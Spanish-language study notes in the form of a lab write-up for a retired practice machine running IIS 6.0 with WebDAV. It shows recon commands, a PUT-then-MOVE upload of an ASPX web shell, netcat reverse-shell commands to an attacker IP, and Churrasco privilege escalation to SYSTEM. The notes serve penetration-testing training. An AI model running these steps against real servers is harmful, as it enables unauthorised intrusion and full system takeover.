#CPTS #DavTest #Metodo 

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.234 -oG allPorts
```

Encontramos abierto el puerto `80` así que haremos un reconocimiento tan exhaustivo sobre este
```shell
nmap -p80 -sCV -vvv 10.129.95.234 -oN targeted
```

Obtendremos información sobre las tecnologías usadas por la web
```shell
whatweb http://10.129.95.234
```

Con el [[NMAP]] anteriormente usada vemos que hay un *WebDAV* que es un protocolo el cual nos permite guardar, editar, mover y compartir archivos en un servidor web.
También observamos que es un *IIS 6.0* lo cual es una versión bastante desactualizada.
Además en el escaneo de [[NMAP]] ser nos ha descubierto que hay una gran variedad de métodos permitidos  como cabeceras para la comunicación con este como pueden ser `MOVE`, `DELETE`, `COPY`

Usaremos una herramienta llamada [[DAVTEST]] que nos permite verificar que tipo de ficheros podemos subir y cuales no.
```shell
davtest -url http://10.129.60.207
```

Obteniendo como respuesta la permisión de subida de ficheros `.pl`, `.php`, `.html`, `.jsp`, `.cfm`, `.jhtml` y `.txt`

Al ser un *ISS* lo mas critico seria que se nos permitiese subir extensiones como `.aspx` pero en este caso no se nos a acontecido una vulnerabilidad así.

No nos deja subir este tipo de archivos pero esta el método `MOVE` habilitado, lo cual nos puede permitir subir un archivo con una *Web Shell* en un `.txt` con la opción `PUT` y una vez este archivo este cargado dentro del servicio hacer un `MOVE` y transfórmalo en una archivo `.aspx` con nuestra shell.

Subiremos la `aspx_cmd.aspx` con nombre de `aspxcmd.txt` para que no tenganmos problema al subirlo
```shell
curl -s -X PUT http://10.129.60.207/aspxcmd.txt -d @aspx_cmd.aspx
```

Con subirlo así todavía esta *Web Shell* no va a ser interpretada, ahora usaremos la opción `MOVE` para mover el `.txt` y transformarlo en `.aspx` realizando un renombramiento de archivo.
```shell
curl -s -X MOVE -H "Destination:http://10.129.60.207/aspxcmd.aspx" http://10.129.60.207/aspxcmd.txt
```

Hemos usado la cabecera `Destination` para indicar que el archivo `.txt` queremos que sea movido a la misma ubicación bajo el mismo nombre únicamente cambiando la extensión por `.aspx`

Ahora al acceder a esta *Web Shell* a través del navegador vemos que tenemos la capacidad de ejecución de comandos.
![[Pasted image 20260922100219.png]]

Ahora deberemos de conseguir obtener una *Reverse Shell* a nuestra maquina de atacante.
Primero deberemos de conseguir una conexión usando [[NETCAT]] desde la maquina victima para poder entablar una conexión con nuestra maquina.

Con el [[NETCAT]] en nuestro directorio de trabajo deberemos de ejecutar un server *SMB* compartiendo esta herramienta a nivel de red con [[SMBSERVER]]
```shell
smbserver.py smbFolder $(pwd) 
```

En la *Web Shell* que hemos obtenido anteriormente deberemos de acceder a este recurso compartido en red y ejecutar el [[NETCAT]]
```shell
\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443
```

Y en nuestra maquina atacante nos pondremos en escucha
```shell
rlwrap nc -nlvp 443
```

Consiguiendo entablar una conexión con la maquina victima
![[Pasted image 20260922101714.png]]

# Privilege Scalation

Lo primero que haremos sera buscar si tenemos acceso al directorio de cualquiera de los usuarios, en este caso el directorio de estos se encuentra en `Documents and Settings`
![[Pasted image 20260922103026.png]]

Miraremos los privilegios que tiene nuestro usuario
```shell
whoami /priv
```

![[Pasted image 20260922101948.png]]

Podemos aprovecharnos de `SeImpersonatePrivilege` usando [[JUICY-POTATO]] pero antes deberemos de ver si este es compatible y se puede usar en la versión de Windows que corre actualmente la maquina victima.

Deberemos de ver la versión de la maquina
```shell
systeminfo
```

Viendo que esta corriendo un *Windows Server 2003* en los CLSID del GitHub no indica nada de que no este soportado para esta versión lo único que nos dará problemas.
Por lo cual tendremos que usar otra herramienta similar a esta, en este caso vamos a usar [[CHURRASCO]] `https://github.com/Re4son/Churrasco/raw/master/churrasco.exe` que se usa para versiones antiguas de *Windows Server*
`https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/`

Nos compartiremos como un recurso compartido a nivel de red con [[SMBSERVER]]
```shell
smbserver.py smbFolder $(pwd) 
```

En la maquina victima navegaremos a `C:\Windows\Temp` y nos descargaremos en esa ubicación el archivo
```shell
copy \\10.10.14.226\smbFolder\churrasco.exe churrasco.exe
```

Ahora podremos ejecutar la herramienta, de forma que nos competiremos el [[NETCAT]] a nivel de recurso de red con [[SMBSERVER]] y poniéndonos en escucha en nuestra maquina podemos obtener una *Reverse Shell* como *NT AUTHORITY\SYSTEM*

Primero nos comaptiremos el recurso a nivel de red
```shell
smbserver.py smbFolder $(pwd)
```

Nos pondremos en escucha en el puerto seleccionado
```shell
penelope -p 443
```

Y ejecutaremos [[CHURRASCO]]
```shell
churrasco.exe "\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443" 
```

Obteniendo así una shell con los máximos privilegios y consiguiendo las flas de los usuarios


